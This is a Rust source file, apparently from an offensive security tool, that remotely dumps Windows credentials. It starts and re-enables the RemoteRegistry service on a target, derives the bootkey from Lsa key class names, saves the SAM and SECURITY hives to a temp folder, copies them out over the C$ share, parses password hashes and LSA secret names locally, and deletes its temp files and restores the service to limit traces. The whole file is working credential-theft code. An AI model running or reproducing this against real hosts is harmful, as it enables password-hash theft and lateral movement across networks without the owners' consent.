//! Remote SAM/LSA dump orchestrator.
//!
//! Connects to the remote registry, extracts bootkey via class names,
//! saves SAM/SECURITY hives to temp files, downloads them, parses locally,
//! and cleans up.

use super::hive::Hive;
use super::sam::{self, SamHash};
use std::time::{SystemTime, UNIX_EPOCH};
use windows::Win32::Foundation::ERROR_SUCCESS;
use windows::Win32::Storage::FileSystem::{CopyFileW, DeleteFileW};
use windows::Win32::System::Registry::*;
use windows::Win32::System::Services::*;
use windows::core::PCWSTR;

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Result of a SAM dump operation.
pub struct SamDumpResult {
    pub hashes: Vec<SamHash>,
    pub errors: Vec<String>,
}

/// Result of an LSA dump operation (basic — secret names only for now).
pub struct LsaDumpResult {
    pub secrets: Vec<String>,
    pub errors: Vec<String>,
}

fn gen_tmp_name() -> String {
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}", ts)
}

// ------ Remote Registry service management ------

/// Ensures the RemoteRegistry service is running on the target.
/// Returns `true` if we started it (so we should stop it later).
fn ensure_remote_registry(target: &str) -> Result<bool, String> {
    let target_w = wide(&format!("\\\\{target}"));
    let scm = unsafe { OpenSCManagerW(PCWSTR(target_w.as_ptr()), None, SC_MANAGER_CONNECT) }
        .map_err(|e| format!("OpenSCManager failed: {e}"))?;

    let svc_name = wide("RemoteRegistry");
    let svc = unsafe {
        OpenServiceW(
            scm,
            PCWSTR(svc_name.as_ptr()),
            SERVICE_START
                | SERVICE_STOP
                | SERVICE_QUERY_STATUS
                | SERVICE_CHANGE_CONFIG
                | SERVICE_QUERY_CONFIG,
        )
    }
    .map_err(|e| {
        unsafe {
            let _ = CloseServiceHandle(scm);
        }
        format!("OpenService RemoteRegistry: {e}")
    })?;

    // Query current status
    let mut status = SERVICE_STATUS_PROCESS::default();
    let mut bytes_needed = 0u32;
    let ok = unsafe {
        QueryServiceStatusEx(
            svc,
            SC_STATUS_PROCESS_INFO,
            Some(std::slice::from_raw_parts_mut(
                &mut status as *mut _ as *mut u8,
                std::mem::size_of::<SERVICE_STATUS_PROCESS>(),
            )),
            &mut bytes_needed,
        )
    };
    if ok.is_err() {
        unsafe {
            let _ = CloseServiceHandle(svc);
            let _ = CloseServiceHandle(scm);
        }
        return Err("QueryServiceStatusEx failed".into());
    }

    let already_running = status.dwCurrentState == SERVICE_RUNNING;
    if already_running {
        unsafe {
            let _ = CloseServiceHandle(svc);
            let _ = CloseServiceHandle(scm);
        }
        return Ok(false); // didn't need to start it
    }

    // Query current start type — if Disabled we must change it first
    let mut cfg_buf = vec![0u8; 8192];
    let mut cfg_needed = 0u32;
    let qcfg_ok = unsafe {
        QueryServiceConfigW(
            svc,
            Some(cfg_buf.as_mut_ptr() as *mut QUERY_SERVICE_CONFIGW),
            cfg_buf.len() as u32,
            &mut cfg_needed,
        )
    };
    let was_disabled = if qcfg_ok.is_ok() {
        let cfg = unsafe { &*(cfg_buf.as_ptr() as *const QUERY_SERVICE_CONFIGW) };
        cfg.dwStartType == SERVICE_DISABLED
    } else {
        false
    };

    // If disabled, change to manual (demand-start) so we can start it
    if was_disabled {
        let _ = unsafe {
            ChangeServiceConfigW(
                svc,
                ENUM_SERVICE_TYPE(SERVICE_NO_CHANGE),
                SERVICE_DEMAND_START,
                SERVICE_ERROR(SERVICE_NO_CHANGE),
                PCWSTR::null(),
                PCWSTR::null(),
                None,
                PCWSTR::null(),
                PCWSTR::null(),
                PCWSTR::null(),
                PCWSTR::null(),
            )
        };
    }

    // Start the service
    let start_result = unsafe { StartServiceW(svc, None) };
    if start_result.is_err() {
        // Restore disabled state if we changed it
        if was_disabled {
            let _ = unsafe {
                ChangeServiceConfigW(
                    svc,
                    ENUM_SERVICE_TYPE(SERVICE_NO_CHANGE),
                    SERVICE_DISABLED,
                    SERVICE_ERROR(SERVICE_NO_CHANGE),
                    PCWSTR::null(),
                    PCWSTR::null(),
                    None,
                    PCWSTR::null(),
                    PCWSTR::null(),
                    PCWSTR::null(),
                    PCWSTR::null(),
                )
            };
        }
        unsafe {
            let _ = CloseServiceHandle(svc);
            let _ = CloseServiceHandle(scm);
        }
        return Err(format!(
            "Failed to start RemoteRegistry service: {}",
            start_result.unwrap_err()
        ));
    }

    // Wait for it to be running (up to 10 seconds)
    for _ in 0..20 {
        std::thread::sleep(std::time::Duration::from_millis(500));
        let _ = unsafe {
            QueryServiceStatusEx(
                svc,
                SC_STATUS_PROCESS_INFO,
                Some(std::slice::from_raw_parts_mut(
                    &mut status as *mut _ as *mut u8,
                    std::mem::size_of::<SERVICE_STATUS_PROCESS>(),
                )),
                &mut bytes_needed,
            )
        };
        if status.dwCurrentState == SERVICE_RUNNING {
            break;
        }
    }

    unsafe {
        let _ = CloseServiceHandle(svc);
        let _ = CloseServiceHandle(scm);
    }

    if status.dwCurrentState != SERVICE_RUNNING {
        return Err("RemoteRegistry service did not start in time".into());
    }

    Ok(true) // we started it
}

/// Stop the RemoteRegistry service and restore Disabled state if needed.
fn stop_remote_registry(target: &str) {
    let target_w = wide(&format!("\\\\{target}"));
    let scm = match unsafe { OpenSCManagerW(PCWSTR(target_w.as_ptr()), None, SC_MANAGER_CONNECT) } {
        Ok(h) => h,
        Err(_) => return,
    };

    let svc_name = wide("RemoteRegistry");
    let svc = match unsafe {
        OpenServiceW(
            scm,
            PCWSTR(svc_name.as_ptr()),
            SERVICE_STOP | SERVICE_CHANGE_CONFIG,
        )
    } {
        Ok(h) => h,
        Err(_) => {
            unsafe {
                let _ = CloseServiceHandle(scm);
            }
            return;
        }
    };

    // Stop the service
    let mut status = SERVICE_STATUS::default();
    let _ = unsafe { ControlService(svc, SERVICE_CONTROL_STOP, &mut status) };

    // Restore to Disabled (it was disabled before we started it)
    let _ = unsafe {
        ChangeServiceConfigW(
            svc,
            ENUM_SERVICE_TYPE(SERVICE_NO_CHANGE),
            SERVICE_DISABLED,
            SERVICE_ERROR(SERVICE_NO_CHANGE),
            PCWSTR::null(),
            PCWSTR::null(),
            None,
            PCWSTR::null(),
            PCWSTR::null(),
            PCWSTR::null(),
            PCWSTR::null(),
        )
    };
    unsafe {
        let _ = CloseServiceHandle(svc);
        let _ = CloseServiceHandle(scm);
    }
}

/// Dump SAM hashes from a remote host.
pub fn remote_dump_sam(target: &str) -> Result<SamDumpResult, String> {
    let mut errors = Vec::new();

    // 0. Ensure RemoteRegistry service is running
    let we_started_svc = ensure_remote_registry(target)?;

    // 1. Connect to remote registry
    let mut hklm = HKEY::default();
    let target_w = wide(&format!("\\\\{target}"));
    let ret =
        unsafe { RegConnectRegistryW(PCWSTR(target_w.as_ptr()), HKEY_LOCAL_MACHINE, &mut hklm) };
    if ret != ERROR_SUCCESS {
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("RegConnectRegistry failed: {}", ret.0));
    }

    // 2. Extract bootkey via remote registry class name queries
    let bootkey = match extract_bootkey_remote(hklm) {
        Ok(bk) => bk,
        Err(e) => {
            unsafe {
                let _ = RegCloseKey(hklm);
            }
            if we_started_svc {
                stop_remote_registry(target);
            }
            return Err(format!("Bootkey extraction failed: {e}"));
        }
    };

    // 3. Save SAM hive to temp file on remote machine
    let tmp_name = gen_tmp_name();
    let remote_path = format!("C:\\Windows\\Temp\\{tmp_name}.tmp");
    let unc_path = format!("\\\\{target}\\C$\\Windows\\Temp\\{tmp_name}.tmp");

    let mut sam_key = HKEY::default();
    let sam_str = wide("SAM");
    let ret = unsafe {
        RegOpenKeyExW(
            hklm,
            PCWSTR(sam_str.as_ptr()),
            Some(REG_OPTION_BACKUP_RESTORE.0),
            KEY_READ,
            &mut sam_key,
        )
    };
    if ret != ERROR_SUCCESS {
        unsafe {
            let _ = RegCloseKey(hklm);
        }
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("Cannot open SAM key: {}", ret.0));
    }

    let remote_path_w = wide(&remote_path);
    let ret = unsafe { RegSaveKeyW(sam_key, PCWSTR(remote_path_w.as_ptr()), None) };
    unsafe {
        let _ = RegCloseKey(sam_key);
    };
    if ret != ERROR_SUCCESS {
        unsafe {
            let _ = RegCloseKey(hklm);
        }
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("RegSaveKey SAM failed: {}", ret.0));
    }

    // 4. Download via UNC
    let local_tmp = std::env::temp_dir().join(format!("sam_{tmp_name}.tmp"));
    let local_path_str = local_tmp.to_string_lossy().to_string();
    let unc_w = wide(&unc_path);
    let local_w = wide(&local_path_str);
    let ok = unsafe { CopyFileW(PCWSTR(unc_w.as_ptr()), PCWSTR(local_w.as_ptr()), true) };
    // Clean up remote temp file immediately
    unsafe {
        let _ = DeleteFileW(PCWSTR(unc_w.as_ptr()));
    }
    unsafe {
        let _ = RegCloseKey(hklm);
    };

    if ok.is_err() {
        let _ = std::fs::remove_file(&local_tmp);
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("Failed to download SAM hive from {unc_path}"));
    }

    // 5. Parse hive locally
    let hive_data = match std::fs::read(&local_tmp) {
        Ok(d) => d,
        Err(e) => {
            let _ = std::fs::remove_file(&local_tmp);
            if we_started_svc {
                stop_remote_registry(target);
            }
            return Err(format!("Failed to read local SAM: {e}"));
        }
    };
    let _ = std::fs::remove_file(&local_tmp);

    let hive = Hive::from_bytes(hive_data)?;
    let hashes = match sam::dump_sam_hashes(&hive, &bootkey) {
        Ok(h) => h,
        Err(e) => {
            errors.push(format!("SAM parse error: {e}"));
            Vec::new()
        }
    };

    if we_started_svc {
        stop_remote_registry(target);
    }
    Ok(SamDumpResult { hashes, errors })
}

/// Dump LSA secret names from a remote host (basic version).
pub fn remote_dump_lsa(target: &str) -> Result<LsaDumpResult, String> {
    let mut errors = Vec::new();

    // 0. Ensure RemoteRegistry service is running
    let we_started_svc = ensure_remote_registry(target)?;

    // 1. Connect
    let mut hklm = HKEY::default();
    let target_w = wide(&format!("\\\\{target}"));
    let ret =
        unsafe { RegConnectRegistryW(PCWSTR(target_w.as_ptr()), HKEY_LOCAL_MACHINE, &mut hklm) };
    if ret != ERROR_SUCCESS {
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("RegConnectRegistry failed: {}", ret.0));
    }

    // 2. Extract bootkey
    let bootkey = match extract_bootkey_remote(hklm) {
        Ok(bk) => bk,
        Err(e) => {
            errors.push(format!("Bootkey: {e}"));
            unsafe {
                let _ = RegCloseKey(hklm);
            }
            // Return empty — we can still try to list secret names
            [0u8; 16]
        }
    };

    // 3. Save SECURITY hive
    let tmp_name = gen_tmp_name();
    let remote_path = format!("C:\\Windows\\Temp\\{tmp_name}_sec.tmp");
    let unc_path = format!("\\\\{target}\\C$\\Windows\\Temp\\{tmp_name}_sec.tmp");

    let mut sec_key = HKEY::default();
    let sec_str = wide("SECURITY");
    let ret = unsafe {
        RegOpenKeyExW(
            hklm,
            PCWSTR(sec_str.as_ptr()),
            Some(REG_OPTION_BACKUP_RESTORE.0),
            KEY_READ,
            &mut sec_key,
        )
    };
    if ret != ERROR_SUCCESS {
        unsafe {
            let _ = RegCloseKey(hklm);
        }
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("Cannot open SECURITY key: {}", ret.0));
    }

    let remote_path_w = wide(&remote_path);
    let ret = unsafe { RegSaveKeyW(sec_key, PCWSTR(remote_path_w.as_ptr()), None) };
    unsafe {
        let _ = RegCloseKey(sec_key);
    }
    if ret != ERROR_SUCCESS {
        unsafe {
            let _ = RegCloseKey(hklm);
        }
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("RegSaveKey SECURITY failed: {}", ret.0));
    }

    // 4. Download
    let local_tmp = std::env::temp_dir().join(format!("sec_{tmp_name}.tmp"));
    let local_path_str = local_tmp.to_string_lossy().to_string();
    let unc_w = wide(&unc_path);
    let local_w = wide(&local_path_str);
    let ok = unsafe { CopyFileW(PCWSTR(unc_w.as_ptr()), PCWSTR(local_w.as_ptr()), true) };
    unsafe {
        let _ = DeleteFileW(PCWSTR(unc_w.as_ptr()));
    }
    unsafe {
        let _ = RegCloseKey(hklm);
    }

    if ok.is_err() {
        let _ = std::fs::remove_file(&local_tmp);
        if we_started_svc {
            stop_remote_registry(target);
        }
        return Err(format!("Failed to download SECURITY hive from {unc_path}"));
    }

    // 5. Parse hive — extract secret names + DPAPI keys
    let hive_data = match std::fs::read(&local_tmp) {
        Ok(d) => d,
        Err(e) => {
            let _ = std::fs::remove_file(&local_tmp);
            if we_started_svc {
                stop_remote_registry(target);
            }
            return Err(format!("Failed to read SECURITY hive: {e}"));
        }
    };
    let _ = std::fs::remove_file(&local_tmp);

    let hive = match Hive::from_bytes(hive_data) {
        Ok(h) => h,
        Err(e) => return Err(format!("SECURITY hive parse: {e}")),
    };

    let mut secrets = Vec::new();

    // Try to list Policy\Secrets subkeys
    match hive.path("Policy\\Secrets") {
        Ok(secrets_key) => match hive.subkeys(secrets_key) {
            Ok(children) => {
                for (name, _key) in children {
                    secrets.push(name);
                }
            }
            Err(e) => errors.push(format!("Cannot enumerate secrets: {e}")),
        },
        Err(e) => errors.push(format!("Cannot find Policy\\Secrets: {e}")),
    }

    // Try to extract DPAPI machine key from Policy\PolEKList
    // This requires full LSA key decryption — deferred for now
    if bootkey != [0u8; 16] {
        // We have bootkey but full LSA decryption is complex
        // Show bootkey as a hint
        let bk_hex: String = bootkey.iter().map(|b| format!("{b:02x}")).collect();
        secrets.insert(0, format!("bootkey: {bk_hex}"));
    }

    if we_started_svc {
        stop_remote_registry(target);
    }
    Ok(LsaDumpResult { secrets, errors })
}

// ------ bootkey extraction via remote registry ------

fn extract_bootkey_remote(hklm: HKEY) -> Result<[u8; 16], String> {
    // Determine current control set
    let mut select_key = HKEY::default();
    let select_str = wide("SYSTEM\\Select");
    let ret = unsafe {
        RegOpenKeyExW(
            hklm,
            PCWSTR(select_str.as_ptr()),
            None,
            KEY_READ,
            &mut select_key,
        )
    };
    if ret != ERROR_SUCCESS {
        return Err(format!("Cannot open SYSTEM\\Select: {}", ret.0));
    }

    let mut data = [0u8; 4];
    let mut data_size = 4u32;
    let default_str = wide("Default");
    let ret = unsafe {
        RegQueryValueExW(
            select_key,
            PCWSTR(default_str.as_ptr()),
            None,
            None,
            Some(data.as_mut_ptr()),
            Some(&mut data_size),
        )
    };
    unsafe { RegCloseKey(select_key) };
    if ret != ERROR_SUCCESS {
        return Err(format!("Cannot read Select\\Default: {}", ret.0));
    }
    let cs_num = u32::from_le_bytes(data);

    // Read class names from Lsa subkeys
    let mut scrambled = Vec::with_capacity(16);
    for name in ["JD", "Skew1", "GBG", "Data"] {
        let path = format!("SYSTEM\\ControlSet{:03}\\Control\\Lsa\\{name}", cs_num);
        let path_w = wide(&path);
        let mut key = HKEY::default();
        let ret = unsafe { RegOpenKeyExW(hklm, PCWSTR(path_w.as_ptr()), None, KEY_READ, &mut key) };
        if ret != ERROR_SUCCESS {
            return Err(format!("Cannot open {path}: {}", ret.0));
        }

        let mut class_buf = vec![0u16; 64];
        let mut class_len = class_buf.len() as u32;
        let ret = unsafe {
            RegQueryInfoKeyW(
                key,
                Some(windows::core::PWSTR(class_buf.as_mut_ptr())),
                Some(&mut class_len),
                None,
                None,
                None,
                None,
                None,
                None,
                None,
                None,
                None,
            )
        };
        unsafe { RegCloseKey(key) };
        if ret != ERROR_SUCCESS {
            return Err(format!("Cannot query class of {name}: {}", ret.0));
        }

        let class_str = String::from_utf16_lossy(&class_buf[..class_len as usize]);
        let bytes = hex_decode_bootkey(&class_str)?;
        scrambled.extend_from_slice(&bytes);
    }

    if scrambled.len() < 16 {
        return Err(format!(
            "Scrambled bootkey too short: {} bytes",
            scrambled.len()
        ));
    }

    const PERM: [usize; 16] = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];
    let mut bootkey = [0u8; 16];
    for i in 0..16 {
        bootkey[i] = scrambled[PERM[i]];
    }
    Ok(bootkey)
}

fn hex_decode_bootkey(s: &str) -> Result<Vec<u8>, String> {
    let s = s.trim();
    if s.len() % 2 != 0 {
        return Err(format!("Odd hex length in bootkey class: {}", s.len()));
    }
    (0..s.len())
        .step_by(2)
        .map(|i| {
            u8::from_str_radix(&s[i..i + 2], 16)
                .map_err(|e| format!("Bad hex in bootkey class at {i}: {e}"))
        })
        .collect()
}
